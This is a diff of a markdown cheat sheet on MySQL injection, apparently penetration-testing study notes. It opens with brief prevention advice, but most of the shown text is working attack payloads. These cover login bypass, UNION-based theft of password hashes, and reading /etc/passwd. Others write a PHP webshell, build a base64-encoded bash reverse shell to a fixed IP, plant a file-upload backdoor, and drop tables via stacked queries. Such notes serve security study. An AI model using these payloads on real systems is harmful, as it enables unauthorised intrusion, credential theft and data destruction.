@@ -1,6 +1,12 @@
 # MySQL Injection
 
-SQL Injection (SQLi) happens when  `unsanitized` user input `breaks out` of the `original query` made by the developer and finally passed on to a database to perform malicious actions.
+SQL Injection (SQLi) happens when `unsanitized` user input `breaks out` of the `original query` made by the developer and finally passed on to a database to perform malicious actions.
+
+
+
+{% @github-files/github-code-block %}
+
+
 
 ## Impact / Risk
 
@@ -16,7 +22,7 @@ SQL Injection (SQLi) happens when  `unsanitized` user input `breaks out` of the 
    2. Use of parameterized query, Java context: callable statement for stored procedure
       1. run time binding
    3. Try to use ORM libs like hibernate
-   4. Don't disclose verbose `sql error `to end users
+   4. Don't disclose verbose `sql error` to end users
    5. All database related transactions should have audit log.
 2. Database layer
    1. Instead of quering from table, query from `view` to restrict the access and blast radius.
@@ -28,8 +34,6 @@ SQL Injection (SQLi) happens when  `unsanitized` user input `breaks out` of the 
 3. Network layer
    1. Deploy WAF and periodic update SQLi rules
 
-
-
 > **How does parameterized queries prevents the SQL Injection?**
 >
 > By using runtime binding, developers can ensure that user input is treated as data and not as executable code.
@@ -38,8 +42,6 @@ SQL Injection (SQLi) happens when  `unsanitized` user input `breaks out` of the 
 > 2. When using parameterized queries, the underlying database driver or API automatically handles the escaping of user input. This means that special characters entered by users are treated as data and not as part of the SQL syntax. This prevents these characters from being interpreted as SQL commands.
 > 3. With parameterized queries, the database driver knows the expected data types of the parameters. This type safety helps prevent certain types of injection attacks where an attacker might attempt to inject malicious data of a different type than expected by the query.
 
-
-
 ## Language Type
 
 | Type | Example                        | Usage    |
@@ -47,46 +49,39 @@ SQL Injection (SQLi) happens when  `unsanitized` user input `breaks out` of the 
 | DML  | INSERT, DELETE, UPDATE, SELECT | frequent |
 | DDL  | CREATE, DROP, ALTER, TRUNCATE  | rare     |
 
-
-
 ## MySQL Comment
 
-| Style      | Comment                                                      |
-| ---------- | ------------------------------------------------------------ |
-| Hash style | SELECT * FROM tbl_emp WHERE username = '' OR 1=1;#' AND password = 'anything'; |
-| SQL style  | SELECT * FROM tbl_emp WHERE username = '' OR 1=1;-- -' AND password = 'anything'; |
+| Style      | Comment                                                                             |
+| ---------- | ----------------------------------------------------------------------------------- |
+| Hash style | SELECT \* FROM tbl\_emp WHERE username = '' OR 1=1;#' AND password = 'anything';    |
+| SQL style  | SELECT \* FROM tbl\_emp WHERE username = '' OR 1=1;-- -' AND password = 'anything'; |
 
-                | SELECT * FROM tbl_emp WHERE username = '' OR 1=1;--+-' AND password = 'anything';
+```
+            | SELECT * FROM tbl_emp WHERE username = '' OR 1=1;--+-' AND password = 'anything';
+```
 
-NULL byte style | SELECT * FROM tbl_emp WHERE username = '' OR 1=1;%00' AND password = 'anything'
-C style         | `SELECT * FROM tbl_emp WHERE username = '' OR 1=1;/*' AND password = '*/'';`
-
+NULL byte style | SELECT \* FROM tbl\_emp WHERE username = '' OR 1=1;%00' AND password = 'anything' C style | `SELECT * FROM tbl_emp WHERE username = '' OR 1=1;/*' AND password = '*/'';`
 
 ## Identify the entry point
 
-- Find a page where user can interact with underlying database via his input.
-- For example, searching / lockup a record using job_id, user registration, profile update, deleting an entry
-  - Guess the structure of underlying database query (`SELECT` /  `INSERT` /  `UPDATE` / `DELETE`)
-- While testing, `URL encode` special  characters (i.e specially `blank space`) for GET and POST.
-- `Semicolon` - is used to end the query although it is  `optional` in the payload.
-- Sometimes client side `JavaScript` removes the single quote while supplying through browser. So best practice to deliver the payload through burp.
-
-
+* Find a page where user can interact with underlying database via his input.
+* For example, searching / lockup a record using job\_id, user registration, profile update, deleting an entry
+  * Guess the structure of underlying database query (`SELECT` / `INSERT` / `UPDATE` / `DELETE`)
+* While testing, `URL encode` special characters (i.e specially `blank space`) for GET and POST.
+* `Semicolon` - is used to end the query although it is `optional` in the payload.
+* Sometimes client side `JavaScript` removes the single quote while supplying through browser. So best practice to deliver the payload through burp.
 
 ## Bypass Authentication
 
-The attacker can choose any field - `username` or  `password` or `both` in order to alter  the `intention` of the SQL query made by developer.
+The attacker can choose any field - `username` or `password` or `both` in order to alter the `intention` of the SQL query made by developer.
 
-
-
-- Usually `password` field is not vulnerable as it is not used by the underlying query.
-- `username` field is used by the query through `WHERE` statement in order to fetch the `hash`.
-- Application converts the user supplied `password` into the `hash` and then compare these two `hashes`.
-
+* Usually `password` field is not vulnerable as it is not used by the underlying query.
+* `username` field is used by the query through `WHERE` statement in order to fetch the `hash`.
+* Application converts the user supplied `password` into the `hash` and then compare these two `hashes`.
 
 > - LIMIT {n}, {m}
->   - n = 0 means select `first` row
->   - m = 4 means fetch maximum `four` rows
+>   * n = 0 means select `first` row
+>   * m = 4 means fetch maximum `four` rows
 > - Explicitly specifying through `LIMIT` and `OFFSET` keyword: LIMIT {m} OFFSET {n}
 
 ```
@@ -102,8 +97,6 @@ payload (username) = anything' OR 1=1 LIMIT 2,1;#
 [+] login as 'offsec' user
 payload (username) = offsec' OR 1=1 LIMIT 0,1;#
 ```
-
-
 
 ```
 [+] scenario 1: bypass the length restriction
@@ -124,8 +117,6 @@ select * from users where username='offsec' or 1=1;#' limit 0,1; => after stripp
 TRUE or TRUE
 TRUE
 ```
-
-
 
 ```
 [+] scenario 2: bypass the comment character filtering
@@ -159,8 +150,6 @@ FALSE or TRUE or (TRUE and FALSE)
 TRUE
 ```
 
-
-
 ```
 [+] scenario 3: bypass all special characters filtering
 ======================================================
@@ -192,20 +181,14 @@ FALSE or TRUE
 TRUE
 ```
 
-
-
-
-
 ## `WHERE`, `GROUP BY`, `HAVING` clause in `SELECT`
 
 ### Normal Detection
 
-> - **`In-band`** detection: In this case, same channel is used to inject the sql code and result of exploitation is directly included in response from the web application.
-> - **`Error-based`**:  application throws
->   - `500` status code with Internal Server Error
->   - Verbose SQL error with underlying database query
-
-
+> * **`In-band`** detection: In this case, same channel is used to inject the sql code and result of exploitation is directly included in response from the web application.
+> * **`Error-based`**: application throws
+>   * `500` status code with Internal Server Error
+>   * Verbose SQL error with underlying database query
 
 ```
 [data type = VARCHAR]
@@ -238,7 +221,7 @@ job_id = floor(version())
 
 ### Blind Detection
 
-In this scenario,  server does not display any error message because error message is handled gracefully.
+In this scenario, server does not display any error message because error message is handled gracefully.
 
 #### Boolean Condition Injection
 
@@ -258,13 +241,9 @@ job_id= 2 and 1=2;# => No result, FALSE
 job_id= 2 or 1=1;# => displays all values, SHORT CIRCUIT
 ```
 
-
-
 #### Time based
 
 TBD
-
-
 
 ### How many columns are returned by the underlying original query
 
@@ -281,8 +260,6 @@ payload = admin' union null, null, null;# => returns no record
 [+] we infer that 2 columns are returned by the underlying query
 ```
 
-
-
 ### Balance two queries with `UNION` and find which column is displayed
 
 ```
@@ -294,8 +271,6 @@ payload = admin' union select 'w01t', 'w02t';# => no error and displays addition
 - if found 'w02t' in HTML, This indicates, although 2 columns are returned but application displays only 2nd column.
 - we need only one column to extract all data.
 ```
-
-
 
 ### Data Exfiltration
 
@@ -332,8 +307,6 @@ Enumerate database name:
 payload = admin' union select null, database();#
 ```
 
-
-
 ### Verify user privileges
 
 Check if the present database user can read and write a file,
@@ -341,8 +314,6 @@ Check if the present database user can read and write a file,
 ```
 payload = admin' union select null, concat(grantee,':----:', privilege_type,':----:', is_grantable) from information_schema.user_privileges;#
 ```
-
-
 
 ### Find all tables and columns from metadata
 
@@ -353,8 +324,6 @@ payload = admin' union select null, concat(table_name,':----:',column_name) from
 
 // need limit to iterate 0 -> max ?
 ```
-
-
 
 ### Extracting password hash from mysql.user table
 
@@ -371,8 +340,6 @@ payload = admin' union select null, concat(user,':----:',password) from mysql.us
 - add more than one dictionary file to increase the cracking chances
 ```
 
-
-
 ### Arbitrary File Read
 
 ```
@@ -384,8 +351,6 @@ payload = admin' union select null, load_file('/etc/passwd');#
 
 payload = admin' union select  null, load_file(0x2f6574632f706173737764);#
 ```
-
-
 
 #### Steal entire database & restore locally
 
@@ -414,8 +379,6 @@ run mysql service:/usr/bin/mysqld_safe &
 - show tables;
 ```
 
-
-
 ### Arbitrary File Write
 
 > **Key Point**
@@ -438,9 +401,7 @@ file = '0x' + ''.join("{:x}".format(ord(c)) for c in '<?php echo shell_exec(base
 file => 0x3c3f706870206563686f207368656c6c5f65786563286261736536345f6465636f646528245f4745545b22636d64225d29293b3f3e
 ```
 
-
-
-##### [+] Alternate approach: Push `cmd_webshell` code into the database
+**\[+] Alternate approach: Push `cmd_webshell` code into the database**
 
 If you are able to update / insert any entry then push the `php` code into the database table.
 
@@ -460,8 +421,6 @@ http://192.168.2.11/manual/web_shell_base64.php?cmd=bHMgLWFsCg==
 echo 'bash -i >& /dev/tcp/192.168.16.90/443 0>&1' | base64  => YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE2LjkwLzQ0MyAwPiYxCg==
 ```
 
-
-
 ### Obtain Remote shell
 
 For **linux platform**, we can directly write `reverse_shell.php`.
@@ -479,11 +438,7 @@ payload = admin' union select null, load_file('/var/www/manual/reverse_shell.php
 - access http://192.168.17.252:8000/manual/reverse_shell.php through browser and receive the low privileged shell.
 ```
 
-
-
-For **windows platform**, leverage `cmd_webshell` and download netcat or windows reverse shell via `TFTP`  or inline FTP` from Kali box and execute.
-
-
+For **windows platform**, leverage `cmd_webshell` and download netcat or windows reverse shell via `TFTP` or inline FTP\` from Kali box and execute.
 
 ### File Upload Backdoor
 
@@ -503,9 +458,7 @@ write code for python backdoor
 
 Supply this output through "`cmd`" parameter to create the `x.php` inside the same directory.
 
-
-
-**Stub File**: Create a HTML file inside local Kali to interact with that `php`  script.
+**Stub File**: Create a HTML file inside local Kali to interact with that `php` script.
 
 ```html
 <html>
@@ -521,33 +474,21 @@ Choose a file to upload:<br>
 </html>
 ```
 
-
-
 Access `x.php` file to upload any `reverse_shell.exe` and execute through `cmd_web_shell_base64.php` to obtain the reverse shell.
-
-
-
-
 
 ## Exploiting `ORDER BY` clause
 
 `ORDER BY` clause is basically used to sort the data. In this scenario, user input goes after `ORDER BY` clause .
 
-
-
 **Backend Query:**
 
-- mysql> select id from news where id =1 order by `1` `desc`
-
-
+* mysql> select id from news where id =1 order by `1` `desc`
 
 So input could be a
 
-- column name => VARCHAR
-- column number => NUMBER
-- some time user input can only control => `desc`
-
-
+* column name => VARCHAR
+* column number => NUMBER
+* some time user input can only control => `desc`
 
 ### Detection
 
@@ -574,7 +515,6 @@ using delay
 input : id',(select sleep(10) from dual where database() like database())#
 ```
 
-
 ## Filter Bypass and Payload Obsfuscation
 
 if `space` is filtered then use `/**/` or `brackets` or `tabs`.
@@ -582,8 +522,6 @@ if `space` is filtered then use `/**/` or `brackets` or `tabs`.
 ```
 job_code = 'union/**/select/**/password/**/FROM/**/accounts/**/WHERE/**/username/**/=/**/'admin'#
 ```
-
-
 
 ### Exploiting INSERT Query
 
@@ -595,11 +533,7 @@ Query OK, 1 row affected (0.01 sec)
 
 However, the exploitation is yet possible and we can extract the entire database information.
 
-
-
 > It is possible to INSERT multiple rows/ entries in a single `INSERT` query.
-
-
 
 ## Injection Point
 
@@ -609,11 +543,7 @@ Usually, `INSERT` query is used in the following pages
 2. Comment / feedback page
 3. Add new entry page etc.
 
-
-
 There are some situations, where a user controls only `one` column through UI however underlying `INSERT` query uses more columns.
-
-
 
 Before exploiting the INSERT query, we need to guess the followings
 
@@ -621,15 +551,11 @@ Before exploiting the INSERT query, we need to guess the followings
 2. data types used by those columns
 3. Table name.
 
-
-
 > In a INSERT query, specifying column names are optional.
 >
 > query = `INSERT INTO tbl_post02(comment, pin, age, user) VALUES('hello', 100, 22, 'anonymous');`
 >
 > query without column name = `INSERT INTO tbl_post02() VALUES('hello', 100, 22, 'anonymous');`
-
-
 
 ## Scenario: The user tries to INSERT an entry into a table but the UI does not show any column of that table
 
@@ -637,11 +563,11 @@ Before exploiting the INSERT query, we need to guess the followings
 >
 > However we can extract data from other table via `blind time based injection`.
 
-- Because via `IF` statement we can control the return value.
-- The primary logic:
-  - If MySQL executes sleep() command, insert `x` into the table
-  - Else insert `y`.
-- This technique works for extracting the value from a column that has either be `VARCHAR` or `INT` data type.
+* Because via `IF` statement we can control the return value.
+* The primary logic:
+  * If MySQL executes sleep() command, insert `x` into the table
+  * Else insert `y`.
+* This technique works for extracting the value from a column that has either be `VARCHAR` or `INT` data type.
 
 ### Sub scenario 1: The user can control the first column of the table and column datatype = VARCHAR
 
@@ -691,9 +617,9 @@ poisoned query = INSERT INTO tbl_post03 (comment, city, age, user) VALUES ('blah
 
 #### Case 2: user controls the last or any other VARCHAR column other than the first column
 
-- We can't directly put the payload into the last column because of the leading single quote character that ends the query.
-- If we control the second column then we can place the payload either third or last column.
-- If we control the last column i.e 'user' then we can to add two entries in one INSERT query and then place the payload either the first column / any column of the 2nd entry.
+* We can't directly put the payload into the last column because of the leading single quote character that ends the query.
+* If we control the second column then we can place the payload either third or last column.
+* If we control the last column i.e 'user' then we can to add two entries in one INSERT query and then place the payload either the first column / any column of the 2nd entry.
 
 ```
 # target of extraction: token => INT column of tbl_secret()
@@ -725,11 +651,11 @@ poisoned query =  INSERT INTO tbl_post02() VALUES('blah', (IF((SELECT token from
 
 #### Case 0: App displays only one INT column
 
-- Similar `Case 3: user controls any INT column`: we need to use same blind injection techniques.
+* Similar `Case 3: user controls any INT column`: we need to use same blind injection techniques.
 
 #### Case 1: App displays only one VARCHAR column that user controls
 
-- The same way, we need to add two entries in one INSERT query and put the payload on the displayed column.
+* The same way, we need to add two entries in one INSERT query and put the payload on the displayed column.
 
 ```
 # http://localhost:5000/case02
@@ -810,9 +736,7 @@ it means when two or more queries are queued to be executed by a database one af
 payload = blah', 0, 0, (SELECT version())); drop table tbl_post03;#
 ```
 
-> `SELECT` statement cannot have an `INSERT` or `UPDATE` statement as a sub-select query, so in this case it must be done through stacked SQL queries.
-> On the other hand, if there is a SQL injection in  `INSERT` or `UPDATE`, an attacker would need to take advantage of stacked queries to fetch data.
-
+> `SELECT` statement cannot have an `INSERT` or `UPDATE` statement as a sub-select query, so in this case it must be done through stacked SQL queries. On the other hand, if there is a SQL injection in `INSERT` or `UPDATE`, an attacker would need to take advantage of stacked queries to fetch data.
 
 ### Duplicate key-based insertion to update a value on the same table
 
@@ -842,7 +766,7 @@ poisoned query = INSERT INTO tbl_post03() VALUES('hello', 100, 30, 'admin') ON D
 
 ```
 
-##### Authentication bypass if registration page is vulnerable for SQLi
+**Authentication bypass if registration page is vulnerable for SQLi**
 
 Lets assume, follwoing query is used in the registration page and primay key (email).
 
@@ -861,7 +785,6 @@ poisoned query = INSERT INTO users (email, password) VALUES ('admin@example.com'
 
 it might possible app checks for the existing user before executing the INSERT query. due to this, the above payload may not get a change to execute and blocked by the previous SELECT query.
 ```
-
 
 ## SQLMap Cheatsheet
 
